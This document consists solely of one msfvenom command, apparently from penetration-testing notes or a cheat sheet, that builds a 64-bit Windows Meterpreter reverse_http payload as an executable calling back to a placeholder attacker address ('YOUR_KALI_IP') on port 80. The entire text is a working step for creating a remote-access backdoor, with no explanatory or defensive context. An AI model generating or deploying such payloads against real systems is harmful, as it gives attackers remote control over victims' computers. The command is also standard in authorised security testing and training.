msfvenom -p windows/x64/meterpreter/reverse_http EXITFUNC=thread -a x64 --platform win LHOST=YOUR_KALI_IP LPORT=80 -f exe -o met64.exe
